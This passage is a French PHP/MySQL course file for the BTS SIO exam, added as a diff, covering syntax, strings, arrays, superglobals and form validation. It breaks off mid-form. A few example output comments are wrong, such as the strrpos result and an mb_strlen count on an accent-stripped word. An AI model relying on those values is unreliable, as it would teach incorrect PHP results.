@@ -1,0 +1,4920 @@
+---
+title: "PHP et MySQL"
+description: "Développement web dynamique : PHP procédural et objet, PDO, CRUD complet, sessions, MVC"
+category: "Programmation"
+tags: ["php", "mysql", "pdo", "web", "crud", "sessions"]
+difficulty: "Intermédiaire"
+---
+
+# PHP et MySQL -- Playbook BTS SIO SLAM
+
+---
+
+## Table des matieres
+
+1. Introduction a PHP
+2. Bases du langage
+3. Chaines de caracteres
+4. Tableaux
+5. Superglobales
+6. Formulaires HTML et PHP
+7. Sessions et cookies
+8. Programmation orientee objet
+9. Connexion MySQL avec PDO
+10. Requetes preparees
+11. CRUD complet avec PDO
+12. Architecture MVC
+13. Upload de fichiers
+14. Gestion des erreurs
+15. Securite
+16. Include et require
+17. Pagination des resultats
+18. Exercices d'examen corriges
+
+---
+
+## 1. Introduction a PHP
+
+### 1.1 Historique
+
+PHP (PHP: Hypertext Preprocessor) a ete cree en 1994 par Rasmus Lerdorf. A l'origine un ensemble de scripts Perl pour suivre les visites sur son CV en ligne, le projet a evolue en un langage de programmation complet cote serveur.
+
+Chronologie des versions majeures :
+
+| Version | Annee | Apports principaux |
+|---------|-------|---------------------|
+| PHP 3 | 1998 | Reecriture complete, nom PHP adopte |
+| PHP 4 | 2000 | Moteur Zend, sessions, output buffering |
+| PHP 5 | 2004 | POO complete, PDO, exceptions |
+| PHP 7 | 2015 | Performances x2, types scalaires, operateur null coalescing |
+| PHP 8 | 2020 | JIT, named arguments, match, attributes, union types |
+| PHP 8.1 | 2021 | Enums, fibers, readonly properties |
+| PHP 8.2 | 2022 | Readonly classes, types DNF |
+| PHP 8.3 | 2023 | Typed class constants, json_validate |
+
+### 1.2 Fonctionnement cote serveur
+
+PHP est un langage **interprete cote serveur**. Le navigateur envoie une requete HTTP au serveur web (Apache, Nginx). Le serveur detecte qu'il s'agit d'un fichier `.php`, transmet le fichier a l'interpreteur PHP qui execute le code, puis renvoie le resultat (HTML pur) au navigateur.
+
+```
+Navigateur  --->  Requete HTTP  --->  Serveur Web (Apache)
+                                          |
+                                     Interpreteur PHP
+                                          |
+                                     Code PHP execute
+                                          |
+Navigateur  <---  Reponse HTML  <---  Serveur Web
+```
+
+Le navigateur ne recoit **jamais** le code PHP. Il recoit uniquement le HTML genere. C'est une difference fondamentale avec JavaScript qui s'execute dans le navigateur.
+
+### 1.3 Environnement de developpement : XAMPP et WAMP
+
+Pour developper en PHP sur sa machine locale, on utilise une pile logicielle comprenant :
+
+- **Apache** : serveur web HTTP
+- **MySQL/MariaDB** : systeme de gestion de base de donnees relationnelle
+- **PHP** : interpreteur du langage
+
+**XAMPP** (Cross-platform, Apache, MySQL, PHP, Perl) fonctionne sur Windows, macOS et Linux. **WAMP** (Windows, Apache, MySQL, PHP) est reserve a Windows.
+
+Installation et configuration de XAMPP :
+
+1. Telecharger XAMPP depuis le site officiel apachefriends.org
+2. Installer avec les composants Apache, MySQL et PHP
+3. Lancer le panneau de controle XAMPP
+4. Demarrer Apache et MySQL
+5. Placer les fichiers PHP dans le repertoire `htdocs/`
+6. Acceder aux fichiers via `http://localhost/`
+
+Le fichier de configuration PHP est `php.ini`. Les directives importantes :
+
+```ini
+display_errors = On          ; Afficher les erreurs (dev uniquement)
+error_reporting = E_ALL      ; Signaler toutes les erreurs
+upload_max_filesize = 10M    ; Taille max d'upload
+post_max_size = 12M          ; Taille max des donnees POST
+max_execution_time = 30      ; Temps max d'execution en secondes
+default_charset = "UTF-8"    ; Encodage par defaut
+```
+
+### 1.4 Premier script PHP
+
+Creer un fichier `index.php` dans `htdocs/` :
+
+```php
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Premier script PHP</title>
+</head>
+<body>
+    <h1>Bienvenue</h1>
+    <?php
+        echo "<p>Ce texte est genere par PHP.</p>";
+        echo "<p>Version de PHP : " . phpversion() . "</p>";
+        echo "<p>Date du jour : " . date("d/m/Y H:i:s") . "</p>";
+    ?>
+</body>
+</html>
+```
+
+Le code PHP est delimite par les balises `<?php` et `?>`. La fonction `echo` envoie du texte dans le flux de sortie HTML. Chaque instruction se termine par un point-virgule.
+
+Pour verifier la configuration complete de PHP :
+
+```php
+<?php
+phpinfo();
+?>
+```
+
+Cette fonction affiche une page detaillee avec toutes les directives de configuration, les extensions chargees et les variables d'environnement.
+
+---
+
+## 2. Bases du langage PHP
+
+### 2.1 Variables
+
+En PHP, les variables commencent par le signe `$`. Elles ne necessitent pas de declaration de type (typage dynamique). Le nom d'une variable est sensible a la casse.
+
+```php
+<?php
+$nom = "Dupont";          // string
+$age = 25;                // integer
+$taille = 1.75;           // float (double)
+$estEtudiant = true;      // boolean
+$donnees = null;           // null
+
+// Affichage
+echo $nom;                // Dupont
+echo gettype($age);       // integer
+var_dump($taille);        // float(1.75)
+```
+
+Regles de nommage :
+- Commence par `$` suivi d'une lettre ou underscore
+- Peut contenir lettres, chiffres et underscores
+- Sensible a la casse (`$nom` et `$Nom` sont differentes)
+- Convention camelCase recommandee
+
+### 2.2 Types de donnees
+
+PHP possede 8 types primitifs :
+
+**Types scalaires :**
+
+| Type | Description | Exemple |
+|------|-------------|---------|
+| `int` | Nombre entier | `$x = 42;` |
+| `float` | Nombre decimal | `$x = 3.14;` |
+| `string` | Chaine de caracteres | `$x = "texte";` |
+| `bool` | Booleen | `$x = true;` |
+
+**Types composes :**
+
+| Type | Description | Exemple |
+|------|-------------|---------|
+| `array` | Tableau | `$x = [1, 2, 3];` |
+| `object` | Objet (instance de classe) | `$x = new DateTime();` |
+
+**Types speciaux :**
+
+| Type | Description | Exemple |
+|------|-------------|---------|
+| `null` | Absence de valeur | `$x = null;` |
+| `resource` | Reference externe | `$x = fopen("f.txt", "r");` |
+
+Fonctions de verification de type :
+
+```php
+<?php
+$valeur = "42";
+
+is_string($valeur);   // true
+is_int($valeur);      // false
+is_numeric($valeur);  // true (contient un nombre)
+is_null($valeur);     // false
+is_array($valeur);    // false
+is_bool($valeur);     // false
+isset($valeur);       // true (existe et non null)
+empty($valeur);       // false (non vide)
+```
+
+**Transtypage (casting) :**
+
+```php
+<?php
+$chaine = "42";
+$entier = (int) $chaine;       // 42
+$flottant = (float) "3.14";   // 3.14
+$booleen = (bool) 1;          // true
+$tableau = (array) "texte";   // ["texte"]
+
+// intval, floatval, strval
+$n = intval("123abc");         // 123
+$s = strval(42);               // "42"
+```
+
+### 2.3 Operateurs
+
+**Operateurs arithmetiques :**
+
+```php
+<?php
+$a = 10;
+$b = 3;
+
+echo $a + $b;   // 13  Addition
+echo $a - $b;   // 7   Soustraction
+echo $a * $b;   // 30  Multiplication
+echo $a / $b;   // 3.333...  Division
+echo $a % $b;   // 1   Modulo (reste)
+echo $a ** $b;  // 1000  Exponentiation (PHP 5.6+)
+```
+
+**Operateurs d'affectation :**
+
+```php
+<?php
+$x = 10;
+$x += 5;   // $x = $x + 5  => 15
+$x -= 3;   // $x = $x - 3  => 12
+$x *= 2;   // $x = $x * 2  => 24
+$x /= 4;   // $x = $x / 4  => 6
+$x %= 4;   // $x = $x % 4  => 2
+$x .= " euros";  // concatenation => "2 euros"
+```
+
+**Operateurs de comparaison :**
+
+```php
+<?php
+$a = 5;
+$b = "5";
+
+$a == $b;    // true  (egalite avec conversion de type)
+$a === $b;   // false (egalite stricte : valeur ET type)
+$a != $b;    // false
+$a !== $b;   // true
+$a < 10;     // true
+$a >= 5;     // true
+$a <=> $b;   // 0 (spaceship operator, PHP 7+)
+             // renvoie -1, 0 ou 1
+```
+
+**Operateurs logiques :**
+
+```php
+<?php
+$a = true;
+$b = false;
+
+$a && $b;    // false (ET logique)
+$a || $b;    // true  (OU logique)
+!$a;         // false (NON logique)
+$a and $b;   // false (ET, priorite basse)
+$a or $b;    // true  (OU, priorite basse)
+$a xor $b;   // true  (OU exclusif)
+```
+
+**Operateur null coalescing (PHP 7+) :**
+
+```php
+<?php
+// Renvoie la valeur de gauche si elle existe et n'est pas null,
+// sinon la valeur de droite
+$nom = $_GET['nom'] ?? 'Anonyme';
+
+// Equivalent a :
+$nom = isset($_GET['nom']) ? $_GET['nom'] : 'Anonyme';
+
+// Chainage possible
+$valeur = $a ?? $b ?? $c ?? 'defaut';
+```
+
+### 2.4 Structures de controle
+
+**if / elseif / else :**
+
+```php
+<?php
+$note = 14;
+
+if ($note >= 16) {
+    echo "Tres bien";
+} elseif ($note >= 14) {
+    echo "Bien";
+} elseif ($note >= 12) {
+    echo "Assez bien";
+} elseif ($note >= 10) {
+    echo "Passable";
+} else {
+    echo "Insuffisant";
+}
+```
+
+**Operateur ternaire :**
+
+```php
+<?php
+$age = 20;
+$statut = ($age >= 18) ? "Majeur" : "Mineur";
+echo $statut; // Majeur
+```
+
+**switch :**
+
+```php
+<?php
+$jour = date("l");
+
+switch ($jour) {
+    case "Monday":
+        echo "Lundi";
+        break;
+    case "Tuesday":
+        echo "Mardi";
+        break;
+    case "Wednesday":
+        echo "Mercredi";
+        break;
+    default:
+        echo "Autre jour";
+        break;
+}
+```
+
+**match (PHP 8+) :**
+
+```php
+<?php
+$code = 404;
+
+$message = match ($code) {
+    200 => "OK",
+    301 => "Redirection permanente",
+    404 => "Page non trouvee",
+    500 => "Erreur serveur",
+    default => "Code inconnu",
+};
+
+echo $message; // Page non trouvee
+```
+
+Difference avec `switch` : `match` utilise une comparaison stricte (`===`), ne necessite pas de `break`, et retourne une valeur.
+
+**Boucle while :**
+
+```php
+<?php
+$i = 1;
+while ($i <= 5) {
+    echo "Ligne $i<br>";
+    $i++;
+}
+```
+
+**Boucle do...while :**
+
+```php
+<?php
+$i = 1;
+do {
+    echo "Ligne $i<br>";
+    $i++;
+} while ($i <= 5);
+```
+
+La difference : `do...while` execute le bloc au moins une fois avant de verifier la condition.
+
+**Boucle for :**
+
+```php
+<?php
+for ($i = 0; $i < 10; $i++) {
+    echo "Iteration $i<br>";
+}
+```
+
+**Boucle foreach :**
+
+```php
+<?php
+$fruits = ["pomme", "banane", "cerise"];
+
+// Valeurs uniquement
+foreach ($fruits as $fruit) {
+    echo $fruit . "<br>";
+}
+
+// Cle et valeur
+foreach ($fruits as $index => $fruit) {
+    echo "$index : $fruit<br>";
+}
+
+// Tableau associatif
+$personne = ["nom" => "Dupont", "age" => 25];
+foreach ($personne as $cle => $valeur) {
+    echo "$cle : $valeur<br>";
+}
+```
+
+**break et continue :**
+
+```php
+<?php
+for ($i = 0; $i < 10; $i++) {
+    if ($i === 3) {
+        continue; // Passe a l'iteration suivante
+    }
+    if ($i === 7) {
+        break;    // Sort de la boucle
+    }
+    echo $i . " ";
+}
+// Affiche : 0 1 2 4 5 6
+```
+
+### 2.5 Fonctions
+
+**Declaration et appel :**
+
+```php
+<?php
+function saluer(string $nom): string {
+    return "Bonjour, $nom !";
+}
+
+echo saluer("Alice"); // Bonjour, Alice !
+```
+
+**Parametres par defaut :**
+
+```php
+<?php
+function creerUtilisateur(string $nom, string $role = "utilisateur"): string {
+    return "$nom ($role)";
+}
+
+echo creerUtilisateur("Alice");            // Alice (utilisateur)
+echo creerUtilisateur("Bob", "admin");     // Bob (admin)
+```
+
+**Passage par reference :**
+
+```php
+<?php
+function incrementer(int &$valeur): void {
+    $valeur++;
+}
+
+$compteur = 10;
+incrementer($compteur);
+echo $compteur; // 11
+```
+
+**Fonctions anonymes (closures) :**
+
+```php
+<?php
+$carre = function (int $n): int {
+    return $n * $n;
+};
+
+echo $carre(5); // 25
+
+// Utilisation avec array_map
+$nombres = [1, 2, 3, 4, 5];
+$carres = array_map(function ($n) {
+    return $n * $n;
+}, $nombres);
+// [1, 4, 9, 16, 25]
+```
+
+**Fonctions flechees (PHP 7.4+) :**
+
+```php
+<?php
+$double = fn(int $n): int => $n * 2;
+echo $double(5); // 10
+
+$nombres = [1, 2, 3, 4, 5];
+$doubles = array_map(fn($n) => $n * 2, $nombres);
+```
+
+**Typage des fonctions (PHP 7+) :**
+
+```php
+<?php
+function diviser(float $a, float $b): float {
+    if ($b == 0) {
+        throw new InvalidArgumentException("Division par zero");
+    }
+    return $a / $b;
+}
+
+// Type nullable (PHP 7.1+)
+function trouverUtilisateur(int $id): ?string {
+    // Peut retourner string ou null
+    return null;
+}
+
+// Union types (PHP 8+)
+function traiter(int|string $valeur): string {
+    return (string) $valeur;
+}
+
+// Type void
+function afficherMessage(string $msg): void {
+    echo $msg;
+    // pas de return
+}
+```
+
+**Portee des variables :**
+
+```php
+<?php
+$globale = "visible partout";
+
+function test(): void {
+    // $globale n'est PAS accessible ici
+    echo $globale; // Warning: Undefined variable
+
+    // Pour y acceder :
+    global $globale;
+    echo $globale; // OK
+}
+
+// Meilleure pratique : passer en parametre
+function testPropre(string $valeur): void {
+    echo $valeur;
+}
+testPropre($globale);
+```
+
+**Variables statiques :**
+
+```php
+<?php
+function compteur(): int {
+    static $count = 0;
+    $count++;
+    return $count;
+}
+
+echo compteur(); // 1
+echo compteur(); // 2
+echo compteur(); // 3
+```
+
+---
+
+## 3. Chaines de caracteres
+
+### 3.1 Declaration et concatenation
+
+```php
+<?php
+// Guillemets simples : pas d'interpretation des variables
+$chaine1 = 'Texte brut avec un \n literal';
+
+// Guillemets doubles : interpretation des variables et sequences d'echappement
+$nom = "Alice";
+$chaine2 = "Bonjour, $nom !\n";       // Bonjour, Alice ! (saut de ligne)
+$chaine3 = "Valeur : {$nom}s";        // Valeur : Alices (accolades pour delimiter)
+
+// Concatenation avec le point (.)
+$prenom = "Jean";
+$nomFamille = "Dupont";
+$complet = $prenom . " " . $nomFamille; // Jean Dupont
+
+// Concatenation avec affectation
+$texte = "Debut";
+$texte .= " suite";
+$texte .= " fin";
+echo $texte; // Debut suite fin
+```
+
+**Syntaxe Heredoc et Nowdoc :**
+
+```php
+<?php
+$nom = "Alice";
+
+// Heredoc (interprete les variables, comme les guillemets doubles)
+$html = <<<HTML
+<div class="card">
+    <h2>$nom</h2>
+    <p>Bienvenue sur le site.</p>
+</div>
+HTML;
+
+// Nowdoc (pas d'interpretation, comme les guillemets simples)
+$code = <<<'CODE'
+$variable = "pas interpretee";
+echo $variable;
+CODE;
+```
+
+### 3.2 Fonctions de manipulation de chaines
+
+**strlen -- longueur d'une chaine :**
+
+```php
+<?php
+$texte = "Bonjour";
+echo strlen($texte); // 7
+
+// Pour les caracteres multioctets (UTF-8)
+$texte = "Cafe";
+echo mb_strlen($texte); // 5 (correct avec accents)
+```
+
+**substr -- extraction de sous-chaine :**
+
+```php
+<?php
+$texte = "Bonjour le monde";
+
+echo substr($texte, 0, 7);   // Bonjour  (depuis 0, 7 caracteres)
+echo substr($texte, 8);      // le monde (depuis position 8 jusqu'a la fin)
+echo substr($texte, -5);     // monde    (5 derniers caracteres)
+echo substr($texte, 0, -6);  // Bonjour le (tout sauf les 6 derniers)
+```
+
+**strpos -- recherche de position :**
+
+```php
+<?php
+$texte = "Bonjour le monde";
+
+echo strpos($texte, "le");     // 8   (premiere occurrence)
+echo strrpos($texte, "o");     // 13  (derniere occurrence)
+echo strpos($texte, "xyz");    // false (non trouve)
+
+// Attention a la comparaison stricte
+if (strpos($texte, "Bonjour") !== false) {
+    echo "Trouve";
+}
+// Ne pas utiliser == car strpos peut renvoyer 0 (position 0)
+// et 0 == false est true en PHP
+```
+
+**str_replace -- remplacement :**
+
+```php
+<?php
+$texte = "Bonjour le monde";
+
+echo str_replace("monde", "PHP", $texte);
+// Bonjour le PHP
+
+// Remplacement multiple
+$recherche = ["Bonjour", "monde"];
+$remplacement = ["Salut", "PHP"];
+echo str_replace($recherche, $remplacement, $texte);
+// Salut le PHP
+
+// str_ireplace pour insensible a la casse
+echo str_ireplace("bonjour", "Salut", $texte);
+// Salut le monde
+```
+
+**explode -- decoupage en tableau :**
+
+```php
+<?php
+$csv = "Alice;25;Paris;Etudiante";
+$donnees = explode(";", $csv);
+// ["Alice", "25", "Paris", "Etudiante"]
+
+echo $donnees[0]; // Alice
+echo $donnees[2]; // Paris
+
+// Avec limite
+$parties = explode(";", $csv, 3);
+// ["Alice", "25", "Paris;Etudiante"]
+```
+
+**implode -- assemblage depuis un tableau :**
+
+```php
+<?php
+$mots = ["PHP", "est", "un", "langage"];
+echo implode(" ", $mots);
+// PHP est un langage
+
+$valeurs = [1, 2, 3, 4, 5];
+echo implode(", ", $valeurs);
+// 1, 2, 3, 4, 5
+```
+
+**trim -- suppression des espaces :**
+
+```php
+<?php
+$texte = "   Bonjour   ";
+
+echo trim($texte);    // "Bonjour"      (debut et fin)
+echo ltrim($texte);   // "Bonjour   "   (debut)
+echo rtrim($texte);   // "   Bonjour"   (fin)
+
+// Caracteres personnalises
+$chemin = "/dossier/fichier/";
+echo trim($chemin, "/"); // "dossier/fichier"
+```
+
+**Autres fonctions courantes :**
+
+```php
+<?php
+// Casse
+echo strtolower("BONJOUR");     // bonjour
+echo strtoupper("bonjour");     // BONJOUR
+echo ucfirst("bonjour monde");  // Bonjour monde
+echo ucwords("bonjour le monde"); // Bonjour Le Monde
+
+// Repetition
+echo str_repeat("-", 30);       // ------------------------------
+
+// Formatage
+echo number_format(1234567.891, 2, ",", " ");
+// 1 234 567,89
+
+echo sprintf("Article: %s, Prix: %.2f EUR", "Livre", 29.9);
+// Article: Livre, Prix: 29.90 EUR
+
+// Padding
+echo str_pad("42", 5, "0", STR_PAD_LEFT);  // 00042
+echo str_pad("fin", 10, ".");              // fin.......
+
+// Inversion
+echo strrev("PHP"); // PHP
+
+// Comptage
+echo substr_count("abracadabra", "abra"); // 2
+
+// Verification
+echo str_starts_with("Bonjour", "Bon");  // true (PHP 8+)
+echo str_ends_with("Bonjour", "jour");   // true (PHP 8+)
+echo str_contains("Bonjour", "njo");     // true (PHP 8+)
+```
+
+---
+
+## 4. Tableaux
+
+### 4.1 Tableaux indexes
+
+```php
+<?php
+// Declaration
+$fruits = ["pomme", "banane", "cerise"];
+// Equivalent ancien : $fruits = array("pomme", "banane", "cerise");
+
+// Acces par index (commence a 0)
+echo $fruits[0]; // pomme
+echo $fruits[2]; // cerise
+
+// Modification
+$fruits[1] = "mangue";
+
+// Ajout en fin
+$fruits[] = "kiwi";
+
+// Nombre d'elements
+echo count($fruits); // 4
+```
+
+### 4.2 Tableaux associatifs
+
+```php
+<?php
+$personne = [
+    "nom" => "Dupont",
+    "prenom" => "Jean",
+    "age" => 30,
+    "ville" => "Paris"
+];
+
+// Acces
+echo $personne["nom"];    // Dupont
+echo $personne["age"];    // 30
+
+// Modification
+$personne["age"] = 31;
+
+// Ajout
+$personne["email"] = "jean@example.com";
+
+// Verification d'existence
+if (array_key_exists("email", $personne)) {
+    echo "Email present";
+}
+
+if (isset($personne["telephone"])) {
+    echo "Telephone present";
+} else {
+    echo "Telephone absent";
+}
+```
+
+### 4.3 Tableaux multidimensionnels
+
+```php
+<?php
+$etudiants = [
+    [
+        "nom" => "Dupont",
+        "prenom" => "Alice",
+        "notes" => [15, 12, 18, 14]
+    ],
+    [
+        "nom" => "Martin",
+        "prenom" => "Bob",
+        "notes" => [10, 8, 14, 11]
+    ],
+    [
+        "nom" => "Bernard",
+        "prenom" => "Claire",
+        "notes" => [17, 19, 16, 18]
+    ]
+];
+
+// Acces
+echo $etudiants[0]["nom"];        // Dupont
+echo $etudiants[1]["notes"][2];   // 14
+
+// Parcours
+foreach ($etudiants as $etudiant) {
+    $moyenne = array_sum($etudiant["notes"]) / count($etudiant["notes"]);
+    echo $etudiant["prenom"] . " " . $etudiant["nom"]
+         . " : moyenne " . number_format($moyenne, 1) . "<br>";
+}
+```
+
+### 4.4 Fonctions de manipulation des tableaux
+
+**array_push -- ajout en fin :**
+
+```php
+<?php
+$pile = [1, 2, 3];
+array_push($pile, 4, 5);
+// [1, 2, 3, 4, 5]
+
+// Equivalent raccourci
+$pile[] = 6;
+// [1, 2, 3, 4, 5, 6]
+```
+
+**array_merge -- fusion :**
+
+```php
+<?php
+$a = [1, 2, 3];
+$b = [4, 5, 6];
+$c = array_merge($a, $b);
+// [1, 2, 3, 4, 5, 6]
+
+// Avec tableaux associatifs (les cles dupliquees sont ecrasees)
+$defauts = ["couleur" => "bleu", "taille" => "M"];
+$options = ["couleur" => "rouge"];
+$config = array_merge($defauts, $options);
+// ["couleur" => "rouge", "taille" => "M"]
+
+// Operateur spread (PHP 7.4+)
+$fusion = [...$a, ...$b];
+```
+
+**sort, asort, ksort -- tri :**
+
+```php
+<?php
+// sort : tri par valeur, reindexe les cles
+$nombres = [3, 1, 4, 1, 5, 9];
+sort($nombres);
+// [1, 1, 3, 4, 5, 9]
+
+// rsort : tri decroissant
+rsort($nombres);
+// [9, 5, 4, 3, 1, 1]
+
+// asort : tri par valeur, conserve les cles
+$notes = ["Alice" => 15, "Bob" => 12, "Claire" => 18];
+asort($notes);
+// ["Bob" => 12, "Alice" => 15, "Claire" => 18]
+
+// arsort : tri decroissant par valeur
+arsort($notes);
+// ["Claire" => 18, "Alice" => 15, "Bob" => 12]
+
+// ksort : tri par cle
+ksort($notes);
+// ["Alice" => 15, "Bob" => 12, "Claire" => 18]
+
+// usort : tri personnalise
+$produits = [
+    ["nom" => "Clavier", "prix" => 49.99],
+    ["nom" => "Souris", "prix" => 29.99],
+    ["nom" => "Ecran", "prix" => 299.99],
+];
+usort($produits, function ($a, $b) {
+    return $a["prix"] <=> $b["prix"];
+});
+// Trie par prix croissant
+```
+
+**array_filter -- filtrage :**
+
+```php
+<?php
+$nombres = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10];
+
+// Filtrer les nombres pairs
+$pairs = array_filter($nombres, function ($n) {
+    return $n % 2 === 0;
+});
+// [2, 4, 6, 8, 10] (conserve les cles originales)
+
+// Reindexer apres filtrage
+$pairs = array_values($pairs);
+// [2, 4, 6, 8, 10] (cles 0, 1, 2, 3, 4)
+
+// Sans callback : supprime les valeurs "falsy"
+$donnees = [0, 1, "", "texte", null, false, true];
+$filtrees = array_filter($donnees);
+// [1, "texte", true]
+```
+
+**array_map -- transformation :**
+
+```php
+<?php
+$nombres = [1, 2, 3, 4, 5];
+
+// Doubler chaque element
+$doubles = array_map(function ($n) {
+    return $n * 2;
+}, $nombres);
+// [2, 4, 6, 8, 10]
+
+// Avec fonction flechee
+$carres = array_map(fn($n) => $n ** 2, $nombres);
+// [1, 4, 9, 16, 25]
+
+// Appliquer sur un tableau associatif
+$noms = ["alice", "bob", "claire"];
+$majuscules = array_map('strtoupper', $noms);
+// ["ALICE", "BOB", "CLAIRE"]
+```
+
+**in_array -- recherche de valeur :**
+
+```php
+<?php
+$fruits = ["pomme", "banane", "cerise"];
+
+echo in_array("banane", $fruits);     // true
+echo in_array("mangue", $fruits);     // false
+
+// Recherche stricte (type + valeur)
+$mixte = [0, 1, 2, "trois"];
+echo in_array("trois", $mixte, true);  // true
+echo in_array(0, $mixte, true);        // true
+echo in_array("0", $mixte, true);      // false
+```
+
+**count -- comptage :**
+
+```php
+<?php
+$tableau = [1, 2, 3, 4, 5];
+echo count($tableau); // 5
+
+// Comptage recursif
+$multi = [[1, 2], [3, 4, 5], [6]];
+echo count($multi);                // 3 (premier niveau)
+echo count($multi, COUNT_RECURSIVE); // 9 (tous les elements)
+```
+
+**Autres fonctions utiles :**
+
+```php
+<?php
+$tableau = [3, 1, 4, 1, 5, 9, 2, 6];
+
+// Extraction
+$extrait = array_slice($tableau, 2, 3); // [4, 1, 5]
+
+// Recherche de cle par valeur
+$cle = array_search(5, $tableau); // 4
+
+// Supprimer un element par cle
+unset($tableau[3]);
+$tableau = array_values($tableau); // Reindexer
+
+// Unique
+$unique = array_unique([1, 2, 2, 3, 3, 3]);
+// [1, 2, 3]
+
+// Inverser
+$inverse = array_reverse($tableau);
+
+// Cles et valeurs separees
+$assoc = ["a" => 1, "b" => 2, "c" => 3];
+$cles = array_keys($assoc);     // ["a", "b", "c"]
+$valeurs = array_values($assoc); // [1, 2, 3]
+
+// Combiner deux tableaux
+$cles = ["nom", "age", "ville"];
+$vals = ["Alice", 25, "Paris"];
+$combine = array_combine($cles, $vals);
+// ["nom" => "Alice", "age" => 25, "ville" => "Paris"]
+
+// Somme et produit
+echo array_sum([1, 2, 3, 4, 5]);     // 15
+echo array_product([1, 2, 3, 4, 5]); // 120
+
+// Reduction
+$somme = array_reduce([1, 2, 3, 4, 5], function ($acc, $val) {
+    return $acc + $val;
+}, 0);
+// 15
+
+// Aplatir avec array_merge et splat
+$nested = [[1, 2], [3, 4], [5, 6]];
+$flat = array_merge(...$nested);
+// [1, 2, 3, 4, 5, 6]
+```
+
+---
+
+## 5. Superglobales
+
+Les superglobales sont des tableaux associatifs predefinies, accessibles partout dans le code sans declaration `global`.
+
+### 5.1 $_GET
+
+Contient les parametres passes dans l'URL (query string).
+
+```
+URL : http://localhost/page.php?nom=Dupont&age=25
+```
+
+```php
+<?php
+$nom = $_GET['nom'];  // "Dupont"
+$age = $_GET['age'];  // "25" (toujours une string)
+
+// Toujours verifier l'existence
+if (isset($_GET['nom'])) {
+    $nom = htmlspecialchars($_GET['nom']);
+}
+
+// Avec operateur null coalescing
+$page = $_GET['page'] ?? 1;
+```
+
+### 5.2 $_POST
+
+Contient les donnees envoyees par un formulaire en methode POST.
+
+```html
+<form method="POST" action="traitement.php">
+    <input type="text" name="email">
+    <input type="password" name="motdepasse">
+    <button type="submit">Connexion</button>
+</form>
+```
+
+```php
+<?php
+// traitement.php
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $email = $_POST['email'] ?? '';
+    $motdepasse = $_POST['motdepasse'] ?? '';
+
+    // Traitement...
+}
+```
+
+Difference GET vs POST :
+- **GET** : donnees dans l'URL, visibles, limitees en taille (~2000 caracteres), mises en cache, pour la lecture
+- **POST** : donnees dans le corps de la requete, non visibles dans l'URL, pas de limite pratique, pour les ecritures
+
+### 5.3 $_SESSION
+
+Permet de stocker des donnees cote serveur, liees a un utilisateur via un cookie de session.
+
+```php
+<?php
+session_start(); // Obligatoire en debut de script, avant tout output HTML
+
+// Ecriture
+$_SESSION['utilisateur'] = 'Alice';
+$_SESSION['role'] = 'admin';
+
+// Lecture
+echo $_SESSION['utilisateur']; // Alice
+
+// Suppression d'une variable
+unset($_SESSION['role']);
+
+// Destruction complete de la session
+session_destroy();
+```
+
+### 5.4 $_COOKIE
+
+Contient les cookies envoyes par le navigateur.
+
+```php
+<?php
+// Creer un cookie (avant tout output HTML)
+setcookie("theme", "sombre", time() + 3600 * 24 * 30); // 30 jours
+
+// Lire
+if (isset($_COOKIE['theme'])) {
+    echo $_COOKIE['theme']; // sombre
+}
+
+// Supprimer (expiration dans le passe)
+setcookie("theme", "", time() - 3600);
+```
+
+### 5.5 $_SERVER
+
+Contient des informations sur le serveur et la requete HTTP.
+
+```php
+<?php
+echo $_SERVER['REQUEST_METHOD'];  // GET ou POST
+echo $_SERVER['REQUEST_URI'];     // /page.php?id=5
+echo $_SERVER['HTTP_HOST'];       // localhost
+echo $_SERVER['DOCUMENT_ROOT'];   // /var/www/html
+echo $_SERVER['PHP_SELF'];        // /page.php
+echo $_SERVER['REMOTE_ADDR'];     // IP du client
+echo $_SERVER['HTTP_USER_AGENT']; // Navigateur du client
+echo $_SERVER['QUERY_STRING'];    // id=5
+echo $_SERVER['SCRIPT_FILENAME']; // Chemin absolu du script
+```
+
+### 5.6 $_FILES
+
+Contient les informations sur les fichiers uploades. Detaille dans le chapitre 13 (Upload de fichiers).
+
+```php
+<?php
+// Structure de $_FILES apres upload
+$_FILES['photo']['name'];      // Nom original du fichier
+$_FILES['photo']['type'];      // Type MIME (image/jpeg)
+$_FILES['photo']['size'];      // Taille en octets
+$_FILES['photo']['tmp_name'];  // Chemin temporaire sur le serveur
+$_FILES['photo']['error'];     // Code d'erreur (0 = OK)
+```
+
+---
+
+## 6. Formulaires HTML et PHP
+
+### 6.1 Formulaire en methode GET
+
+```html
+<!-- recherche.html -->
+<form method="GET" action="resultats.php">
+    <label for="q">Recherche :</label>
+    <input type="text" id="q" name="q" required>
+    <button type="submit">Chercher</button>
+</form>
+```
+
+```php
+<?php
+// resultats.php
+$recherche = $_GET['q'] ?? '';
+$recherche = htmlspecialchars(trim($recherche));
+
+if (!empty($recherche)) {
+    echo "Resultats pour : $recherche";
+}
+```
+
+### 6.2 Formulaire en methode POST
+
+```php
+<?php
+// inscription.php
+$erreurs = [];
+$nom = '';
+$email = '';
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    // Recuperation et nettoyage
+    $nom = trim($_POST['nom'] ?? '');
+    $email = trim($_POST['email'] ?? '');
+    $age = (int) ($_POST['age'] ?? 0);
+
+    // Validation
+    if (empty($nom)) {
+        $erreurs[] = "Le nom est obligatoire";
+    } elseif (strlen($nom) < 2 || strlen($nom) > 50) {
+        $erreurs[] = "Le nom doit contenir entre 2 et 50 caracteres";
+    }
+
+    if (empty($email)) {
+        $erreurs[] = "L'email est obligatoire";
+    } elseif (!filter_var($email, FILTER_VALIDATE_EMAIL)) {
+        $erreurs[] = "L'email n'est pas valide";
+    }
+
+    if ($age < 16 || $age > 120) {
+        $erreurs[] = "L'age doit etre entre 16 et 120";
+    }
+
+    // Si pas d'erreurs, traitement
+    if (empty($erreurs)) {
+        // Enregistrement en base, redirection...
+        header("Location: succes.php");
+        exit;
+    }
+}
+?>
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Inscription</title>
+</head>
+<body>
+    <h1>Inscription</h1>
+
+    <?php if (!empty($erreurs)): ?>
+        <div style="color: red;">
+            <ul>
+                <?php foreach ($erreurs as $erreur): ?>
+                    <li><?= htmlspecialchars($erreur) ?></li>
+                <?php endforeach; ?>
+            </ul>
+        </div>
+    <?php endif; ?>
+
+    <form method="POST" action="">
+        <div>
+            <label for="nom">Nom :</label>
